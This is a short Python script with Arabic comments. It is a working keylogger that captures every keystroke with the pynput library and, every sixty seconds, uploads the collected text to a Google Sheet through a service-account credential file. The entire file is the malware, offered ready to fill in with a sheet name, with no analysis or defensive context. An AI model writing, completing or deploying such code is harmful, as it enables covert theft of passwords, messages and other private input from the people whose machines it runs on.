import gspread
from oauth2client.service_account import ServiceAccountCredentials
import pynput.keyboard
import threading

# إعداد Google Sheets API
scope = ["https://spreadsheets.google.com/feeds", 'https://www.googleapis.com/auth/drive']
creds = ServiceAccountCredentials.from_json_keyfile_name('credentials.json', scope)
client = gspread.authorize(creds)

# فتح ملف Google Sheets
sheet = client.open("report").sheet1  # ضع اسم ملف Google Sheets هنا

log = ""  # تخزين ضغطات المفاتيح

def process_key_press(key):
    global log
    try:
        log += str(key.char)
    except AttributeError:
        if key == key.space:
            log += " "
        else:
            log += " " + str(key) + " "

def report():
    global log
    if log:
        # إرسال البيانات إلى Google Sheets
        sheet.append_row([log])
        print("تم إرسال البيانات إلى Google Sheets: ", log)
    log = ""  # إعادة تعيين سجل ضغطات المفاتيح
    timer = threading.Timer(60, report)  # الإرسال كل 60 ثانية
    timer.start()

from pynput import keyboard

# بدء الاستماع لضغطات المفاتيح
with keyboard.Listener(on_press=process_key_press) as listener:
    report()
    listener.join()
